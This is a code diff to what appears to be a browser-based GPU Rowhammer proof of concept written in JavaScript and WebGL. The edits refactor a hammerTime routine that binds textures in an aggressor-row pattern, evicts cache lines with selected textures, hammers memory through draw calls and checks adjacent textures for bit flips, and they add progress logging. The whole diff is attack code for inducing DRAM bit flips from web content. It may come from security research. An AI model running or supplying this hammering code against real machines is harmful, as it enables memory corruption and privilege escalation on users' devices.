@@ -19,7 +19,7 @@ async function glitch() {
     shader.use();
 
     // TODO: call with every chunk of contiguous memory
-    hammerTime();
+    hammerTime(contPages[0]);
 
 
     // debug with framebuffer (view texture contents)
@@ -46,6 +46,8 @@ function hammerTime(contMem) {
         // hammer every bank in a row
         for (let localOffset = 0; localOffset < 16; localOffset += 2) {
             let offset = row + localOffset;
+            console.log(`+++ Prepare bank [${offset}] [${offset + 1}]`);
+
 
             // fill textures in row n-1, n+1 with 0
             // TODO: only necessary when hammering row 1
@@ -60,40 +62,41 @@ function hammerTime(contMem) {
             fillTexture(contMem[offset + 17].texture, 0xFF);
             
             // pass hammer textures according to hammer pattern: jump to differnet row to trigger row buffer when hammering
-            bindTexture(contMem[offset + 0].texture, 0, 'H', offset + 0);
-            bindTexture(contMem[offset + 32].texture, 2, 'H', offset + 32);
-            bindTexture(contMem[offset + 1].texture, 4, 'H', offset + 1);
-            bindTexture(contMem[offset + 33].texture, 6, 'H', offset + 33);
+            shader.bindTexture(contMem[offset + 0].texture, 0, 'H', offset + 0);
+            shader.bindTexture(contMem[offset + 32].texture, 2, 'H', offset + 32);
+            shader.bindTexture(contMem[offset + 1].texture, 4, 'H', offset + 1);
+            shader.bindTexture(contMem[offset + 33].texture, 6, 'H', offset + 33);
         
             // select 5 textures for eviction
             if (row >= 16) {
                 if (localOffset < 8) {
                     // take 5 textures from end of first row: 11,12,13,14,15
                     for (let i = 0; i < 5; i++) {
-                        bindTexture(contMem[11 + i].texture, i == 4 ? 8 : i*2+1, 'H', 11 + i);
+                        shader.bindTexture(contMem[11 + i].texture, i == 4 ? 8 : i*2+1, 'H', 11 + i);
                     }
                 } else {
                     // take 5 textures from beginning of first row: 0,1,2,3,4
                     for (let i = 0; i < 5; i++) {
-                        bindTexture(contMem[i].texture, i == 4 ? 8 : i*2+1, 'H', i);
+                        shader.bindTexture(contMem[i].texture, i == 4 ? 8 : i*2+1, 'H', i);
                     }
                 }
             } else {
                 if (localOffset < 8) {
                     // take 5 textures from end of last row: 59,60,61,62,63
                     for (let i = 0; i < 5; i++) {
-                        bindTexture(contMem[59 + i].texture, i == 4 ? 8 : i*2+1, 'H', 59 + i);
+                        shader.bindTexture(contMem[59 + i].texture, i == 4 ? 8 : i*2+1, 'H', 59 + i);
                     }
                 } else {
                     // take 5 textures from beginning of last row: 48,49,50,51,52
                     for (let i = 0; i < 5; i++) {
-                        bindTexture(contMem[48 + i].texture, i == 4 ? 8 : i*2+1, 'H', 48 + i);
+                        shader.bindTexture(contMem[48 + i].texture, i == 4 ? 8 : i*2+1, 'H', 48 + i);
                     }
                 }
             }
 
             // hammer textures
-            gl.drawArrays(GL_POINTS, 0, 1);
+            console.log(`+++ Hammering bank [${offset}] [${offset + 1}]`);
+            gl.drawArrays(gl.POINTS, 0, 1);
 
             // check hammered textures for bit flip
             checkForFlip(contMem[offset + 16].texture, offset+16);
